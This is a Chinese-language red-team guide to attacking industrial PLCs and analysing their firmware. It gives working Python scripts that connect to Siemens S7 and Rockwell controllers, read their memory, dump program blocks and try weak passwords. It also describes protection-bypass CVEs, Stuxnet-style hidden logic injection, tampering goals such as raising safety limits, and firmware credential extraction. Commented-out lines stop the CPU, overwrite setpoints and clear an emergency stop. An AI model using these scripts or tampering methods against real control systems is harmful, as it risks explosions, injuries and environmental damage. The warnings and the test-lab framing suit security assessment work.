# PLC 攻击与固件分析

> ⛔ 安全警告: PLC 直接控制物理过程。所有攻击操作仅限安全隔离的测试环境。NEVER 修改 SIS (Safety Instrumented System)！

---

## 一、Siemens S7 系列攻击

### 1.1 S7-300/400（S7comm 协议，无认证）

```
S7-300/400 特征:
├─ 使用 S7comm 协议（端口 102）
├─ ⛔ 无任何认证机制 → 直接读写
├─ 通过 TSAP（Transport Service Access Point）连接
│   S7-300: Rack=0, Slot=2
│   S7-400: Rack=0, Slot=3（或其他）
├─ 支持: CPU 信息读取、DB 读写、程序上传/下载、Start/Stop
└─ 仍在大量工业环境中运行
```

```python
#!/usr/bin/env python3
"""Siemens S7-300/400 完整操作"""
import snap7

plc = snap7.client.Client()

# 连接（S7-300: slot=2, S7-400: slot=3）
plc.connect('TARGET_IP', rack=0, slot=2)

# === 信息收集 ===
# CPU 信息
info = plc.get_cpu_info()
print(f"Module Type: {info.ModuleTypeName}")
print(f"Serial:      {info.SerialNumber}")
print(f"Module Name: {info.ModuleName}")
print(f"Copyright:   {info.Copyright}")

# CPU 状态
state = plc.get_cpu_state()
print(f"CPU State: {state}")  # S7CpuStatusRun / S7CpuStatusStop

# 读取保护等级
protection = plc.get_protection()
print(f"Protection Level: {protection}")

# === 数据块操作 ===
# 列出所有数据块
block_list = plc.list_blocks()
print(f"OB blocks: {block_list.OBCount}")
print(f"FB blocks: {block_list.FBCount}")
print(f"FC blocks: {block_list.FCCount}")
print(f"DB blocks: {block_list.DBCount}")

# 读取 DB 块数据
data = plc.db_read(db_number=1, start=0, size=100)
print(f"DB1 (hex): {data.hex()}")

# 解析 DB 数据（需要知道数据结构）
import struct
# 示例: DB1 offset 0 = REAL (4 bytes), offset 4 = INT (2 bytes)
temp = struct.unpack('>f', data[0:4])[0]
speed = struct.unpack('>h', data[4:6])[0]
print(f"Temperature: {temp:.1f}°C, Speed: {speed} RPM")

# === 内存区域读取 ===
# 输入映像 (I): 传感器状态
inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)
print(f"Inputs: {inputs.hex()}")

# 输出映像 (Q): 执行器状态
outputs = plc.read_area(snap7.types.Areas.PA, 0, 0, 10)
print(f"Outputs: {outputs.hex()}")

# 标志位 (M): 内部标志
markers = plc.read_area(snap7.types.Areas.MK, 0, 0, 10)
print(f"Markers: {markers.hex()}")

# === ⛔ 危险操作（仅安全测试环境）===
# 停止 CPU
# plc.plc_stop()

# 启动 CPU（冷启动/热启动）
# plc.plc_cold_start()
# plc.plc_hot_start()

# 写入 DB 数据
# data_to_write = struct.pack('>f', 50.0)  # 写入温度设定值
# plc.db_write(db_number=1, start=0, data=data_to_write)

plc.disconnect()
```

### 1.2 S7-1200/1500（S7comm+ 协议，密码保护）

```
S7-1200/1500 特征:
├─ 使用 S7comm+ 协议（增强版）
├─ 支持密码保护（Full Access Password / Read Password）
├─ TIA Portal 项目中配置的密码 → 可能是弱密码
├─ 某些版本存在已知 CVE 可绕过保护
└─ 仍然使用端口 102

密码保护等级:
├─ No Protection → 直接访问（和 S7-300 一样）
├─ Read Protection → 读取需密码
├─ Read/Write Protection → 读写都需密码
└─ Full Protection → 所有操作需密码
```

```python
# S7-1200/1500 密码连接
plc = snap7.client.Client()
plc.connect('TARGET_IP', rack=0, slot=1)  # S7-1200: slot=1

# 尝试密码认证
try:
    plc.set_session_password('password123')  # 尝试常见弱密码
    print("[+] Password accepted!")
except Exception as e:
    print(f"[-] Password rejected: {e}")

# 常见默认/弱密码:
# (空), 1, 12, 123, 1234, 12345, 123456
# siemens, SIEMENS, admin, password, plc
```

### 1.3 密码保护绕过

```
已知绕过方法:
├─ CVE-2019-13945 (S7-1200 v4.x)
│   通过特殊 S7comm+ 数据包绕过 CPU 保护
│   → 无需密码直接读写 CPU 数据
│
├─ CVE-2020-15782 (S7-1200/1500)
│   内存读写漏洞 → 绕过沙箱 → 执行任意机器码
│   → 可提取 PLC 固件、注入恶意代码
│
├─ Replay Attack
│   嗅探合法 TIA Portal 连接 → 重放密码认证包
│   S7comm+ 密码以弱保护方式传输
│
└─ 密码提取
    从 TIA Portal 项目文件 (.ap1x) 中提取密码
    项目文件常存储在 Engineering Workstation 上
    → 入侵 EWS → 提取项目 → 获取 PLC 密码
```

### 1.4 PLC Program Upload/Download

```python
# 上传（读取）PLC 程序
# 读取 OB1（主程序块）
ob1_data = plc.full_upload(snap7.types.Block.BlockType['OB'], 1)
with open('OB1_backup.bin', 'wb') as f:
    f.write(ob1_data)

# 读取所有 DB 块
for db_num in range(1, 100):
    try:
        db_data = plc.full_upload(snap7.types.Block.BlockType['DB'], db_num)
        with open(f'DB{db_num}.bin', 'wb') as f:
            f.write(db_data)
        print(f"[+] DB{db_num}: {len(db_data)} bytes")
    except Exception:
        pass

# ⛔ 下载（写入）程序到 PLC
# 这是最危险的操作 — 可以完全改变 PLC 行为
# plc.plc_stop()
# plc.download(block_num=1, data=malicious_ob1, block_type=0x38)
# plc.plc_hot_start()
```

---

## 二、Rockwell/Allen-Bradley 攻击

### 2.1 CompactLogix/ControlLogix

```
Rockwell 系列特征:
├─ 使用 EtherNet/IP + CIP (Common Industrial Protocol)
├─ 默认端口: 44818
├─ ⛔ 默认无认证（CIP Security 是后加的，大多数未启用）
├─ 基于 Tag（变量名）寻址 → 比 Modbus 的地址更直观
└─ 支持结构化数据类型（UDT）
```

```python
#!/usr/bin/env python3
"""Rockwell CompactLogix/ControlLogix 操作"""
from pycomm3 import LogixDriver

with LogixDriver('TARGET_IP') as plc:
    # === 信息收集 ===
    info = plc.get_plc_info()
    print(f"Product Name: {info['product_name']}")
    print(f"Product Type: {info['product_type']}")
    print(f"Vendor:       {info['vendor']}")
    print(f"Serial:       {info['serial']}")
    print(f"Revision:     {info['revision']}")

    # 获取完整标签列表（关键信息收集步骤）
    tags = plc.get_tag_list()
    print(f"\n[*] Total tags: {len(tags)}")
    for tag in tags:
        print(f"  {tag['tag_name']:30s} | Type: {tag['data_type_name']:15s} | "
              f"Dim: {tag.get('dimensions', 0)}")

    # === 读取标签值 ===
    # 读取单个标签
    result = plc.read('MotorSpeed')
    print(f"\nMotorSpeed = {result.value} ({result.type})")

    # 读取多个标签（批量）
    results = plc.read('MotorSpeed', 'Temperature', 'PressureSP', 'EmergencyStop')
    for r in results:
        print(f"  {r.tag} = {r.value}")

    # 读取数组
    result = plc.read('SensorArray', count=10)
    print(f"SensorArray[0:10] = {result.value}")

    # 读取 UDT（用户自定义类型）
    result = plc.read('MotorController')
    print(f"MotorController = {result.value}")  # 返回字典

    # === ⛔ 写入操作（仅安全环境）===
    # plc.write('MotorSpeed', 1500)
    # plc.write('EmergencyStop', False)  # ⛔ 解除急停
    # plc.write(('Tag1', 100), ('Tag2', 200))  # 批量写入
```

### 2.2 EtherNet/IP CIP 枚举

```python
#!/usr/bin/env python3
"""EtherNet/IP 设备发现"""
from pycomm3 import CIPDriver

# 发现网络上的 EtherNet/IP 设备
devices = CIPDriver.discover()
for device in devices:
    print(f"[+] IP: {device['ip_address']}")
    print(f"    Product: {device.get('product_name', 'N/A')}")
    print(f"    Vendor:  {device.get('vendor', 'N/A')}")
    print(f"    Serial:  {device.get('serial', 'N/A')}")
```

---

## 三、PLC Logic 篡改

### 3.1 Ladder Logic 注入

```
PLC 程序篡改方法:
├─ 1. 上传现有程序 → 逆向分析逻辑
├─ 2. 修改特定 rung（梯形图行）
├─ 3. 下载修改后的程序到 PLC
├─ 4. PLC 执行被篡改的逻辑

攻击目标示例:
├─ 修改安全限值 → 温度/压力阈值提高 → 超限不报警
├─ 添加后门逻辑 → 特定条件触发恶意操作
├─ 修改控制算法 → PID 参数错误 → 控制不稳定
└─ 隐藏定时器 → 延迟一段时间后触发异常
```

### 3.2 隐藏恶意 OB 块（Stuxnet 技术）

```
Stuxnet 的 PLC 攻击手法:
├─ 1. 入侵 Engineering Workstation（EWS）
├─ 2. Hook TIA Portal / STEP 7 的通信库
│   ├─ 当工程师读取 PLC 程序时 → 返回原始（干净）版本
│   └─ 实际 PLC 中运行的是被篡改版本
│   → Man-in-the-Middle on Engineering Software
│
├─ 3. 注入恶意 OB 块
│   ├─ OB1（主循环）→ 添加恶意逻辑调用
│   ├─ OB35（定时中断）→ 定时执行恶意代码
│   └─ FC/FB（功能块）→ 隐藏恶意逻辑
│
├─ 4. 修改频率转换器控制参数
│   ├─ 正常: 1064 Hz → 修改为交替 1410 Hz 和 2 Hz
│   ├─ 离心机转速异常 → 物理损坏
│   └─ HMI 显示正常值（录制回放攻击）
│
└─ 5. 防检测
    ├─ Hook STEP 7 显示原始程序
    ├─ 只在特定条件下激活恶意逻辑
    └─ 定期恢复正常运行 → 难以察觉
```

### 3.3 Safety Logic Bypass 风险

```
⛔ ABSOLUTE RED LINE — NEVER TOUCH SIS:

Safety Instrumented System (SIS):
├─ 独立的安全控制器（如 Triconex, HIMA, Yokogawa ProSafe）
├─ 功能: 在危险条件下自动紧急停车
├─ 设计为独立于基本过程控制系统（BPCS）
└─ 修改 SIS 可导致:
    ├─ 爆炸/火灾无法自动停车
    ├─ 有毒物质泄露无法关闭阀门
    ├─ 人员伤亡
    └─ 环境灾难

历史案例 — TRITON/TRISIS (2017):
├─ 攻击沙特石化工厂 Triconex SIS
├─ 注入恶意代码到安全控制器
├─ 目标: 禁用安全系统 → 然后触发危险条件
├─ 因 bug 导致 SIS 进入安全关机状态 → 被发现
└─ 如果成功 → 可能造成爆炸和人员伤亡

红队评估中:
├─ ✓ 可以验证 SIS 网络可达性（读取信息）
├─ ⛔ NEVER 写入任何数据到 SIS
├─ ⛔ NEVER 尝试修改 SIS 逻辑
└─ ✓ 记录发现并报告到风险评估
```

---

## 四、PLC 固件分析

### 4.1 固件获取方法

```
获取固件的途径:
├─ 厂商网站下载（更新包 / 安装包）
│   Siemens: 需要 SiePortal 账户
│   Rockwell: 需要 Rockwell TechConnect
│   Schneider: 需要 SE MySchneider
│
├─ 从目标 PLC 直接提取
│   S7comm: 使用 snap7 的 full_upload()
│   CIP: 使用特定 CIP 服务读取固件
│   → 需要连接权限
│
├─ 从 Engineering Workstation 提取
│   TIA Portal 安装目录包含固件
│   %ProgramFiles%\Siemens\Automation\
│
├─ 通过调试接口
│   JTAG / SWD → 直接读取 Flash
│   UART → 获取 bootloader shell
│
└─ 从物理设备提取
    拆解设备 → 脱焊 Flash 芯片 → 读取
    工具: CH341A 编程器, Bus Pirate
```

### 4.2 固件格式识别

```bash
# 基本信息
file firmware.bin
binwalk firmware.bin

# 输出示例:
# DECIMAL    HEXADECIMAL  DESCRIPTION
# 0          0x0          ARM Cortex-M firmware
# 4096       0x1000       gzip compressed data
# 524288     0x80000      Squashfs filesystem
# 786432     0xC0000      JFFS2 filesystem

# 熵分析（识别加密/压缩区域）
binwalk -E firmware.bin
# 高熵区域（接近 1.0）→ 加密或压缩
# 低熵区域 → 明文数据或代码

# 字符串提取（寻找敏感信息）
strings -n 8 firmware.bin | grep -iE 'password|key|secret|admin|root|login'
strings -n 8 firmware.bin | grep -iE 'http|ftp|ssh|telnet'
strings -n 8 firmware.bin | grep -iE '192\.|10\.|172\.'
```

### 4.3 固件提取与分析

```bash
# binwalk 自动提取
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# firmware-mod-kit 提取
./extract-firmware.sh firmware.bin

# 手动提取（dd）
dd if=firmware.bin of=rootfs.squashfs bs=1 skip=524288 count=262144

# 挂载文件系统
unsquashfs rootfs.squashfs
cd squashfs-root/

# 分析提取的文件系统
find . -name "*.conf" -o -name "*.cfg" -o -name "*.ini"  # 配置文件
find . -name "*.key" -o -name "*.pem" -o -name "*.crt"   # 密钥/证书
find . -name "passwd" -o -name "shadow"                     # 凭据
find . -perm -u+s -type f                                   # SUID 文件

# 使用 Ghidra 逆向分析主程序
# 导入提取的 ELF/BIN → 选择正确的处理器架构
# 常见架构: ARM, ARM Cortex-M, PowerPC, MIPS, x86
```

### 4.4 常见漏洞模式

```
PLC 固件常见漏洞:
├─ Hardcoded Credentials（硬编码凭据）
│   ├─ 搜索: strings | grep -i password
│   ├─ 常见: admin/admin, root/root, service/service
│   └─ 有时是固件中的 SSH/Telnet 后门账户
│
├─ Hardcoded Cryptographic Keys（硬编码密钥）
│   ├─ 用于 TLS 通信的私钥
│   ├─ 用于固件加密/签名的对称密钥
│   └─ 所有同型号设备使用相同密钥 → 一台突破全部受影响
│
├─ Debug Interfaces（调试接口）
│   ├─ Telnet/SSH 默认开启
│   ├─ JTAG/SWD 未禁用
│   ├─ Web 管理界面隐藏端口
│   └─ UART console（物理访问时有用）
│
├─ Buffer Overflow（缓冲区溢出）
│   ├─ Web 服务器处理 HTTP 请求
│   ├─ 工控协议解析（畸形 Modbus/S7comm 包）
│   └─ 配置文件解析
│
├─ 不安全的固件更新
│   ├─ 无签名验证 → 可上传恶意固件
│   ├─ HTTP 明文下载 → MITM 替换固件
│   └─ 降级攻击 → 刷回有漏洞的旧版本
│
└─ 信息泄露
    ├─ 错误信息暴露内部路径/版本
    ├─ 未保护的配置备份接口
    └─ SNMP 社区字符串泄露
```

---

## 五、PLC 攻击工具总览

| 工具 | 目标 | 功能 |
|------|------|------|
| python-snap7 | Siemens S7 | 读写 DB/IO, Start/Stop, 上传/下载 |
| pycomm3 | Rockwell CIP | Tag 读写, 信息获取 |
| pymodbus | Modbus TCP | 寄存器/线圈读写 |
| ISF | 多协议 | 集成利用框架 |
| PLCScan | 多协议 | PLC 枚举与扫描 |
| Nmap ICS NSE | 多协议 | 协议识别与信息收集 |
| binwalk | 固件 | 固件分析与提取 |
| Ghidra | 固件 | 逆向分析 |
| firmware-mod-kit | 固件 | 提取/修改/重打包 |

---

## 六、攻击流程

```
PLC 攻击完整流程:
├─ Phase 1: 发现
│   ├─ Shodan/Censys → 暴露面
│   ├─ 网络扫描 → 端口 102/502/44818/47808
│   └─ 流量分析 → 协议识别
│
├─ Phase 2: 信息收集
│   ├─ 读取 PLC 型号/版本/序列号
│   ├─ 读取程序块列表
│   ├─ 读取 I/O 映射
│   └─ 理解控制逻辑
│
├─ Phase 3: 程序分析
│   ├─ 上传 PLC 程序
│   ├─ 逆向分析控制逻辑
│   ├─ 识别关键控制点
│   └─ 理解安全保护机制
│
├─ Phase 4: 利用（仅安全环境）
│   ├─ 修改设定值 → 验证可写
│   ├─ 停止/启动 PLC → 验证控制
│   └─ 程序篡改 → 仅在测试 PLC 上
│
└─ Phase 5: 报告
    ├─ 记录所有发现
    ├─ 评估业务影响
    ├─ 提供修复建议
    └─ ⛔ 确保测试期间无实际损害
```

---

## 参考链接

- [CISA ICS-CERT](https://www.cisa.gov/ics)
- [Siemens ProductCERT](https://cert-portal.siemens.com/)
- [python-snap7 Documentation](https://python-snap7.readthedocs.io/)
- [Stuxnet Dossier - Symantec](https://www.broadcom.com/support/security-center)
- [TRITON Analysis - Dragos](https://www.dragos.com/resource/trisis-analyzing-safety-system-targeting-malware/)
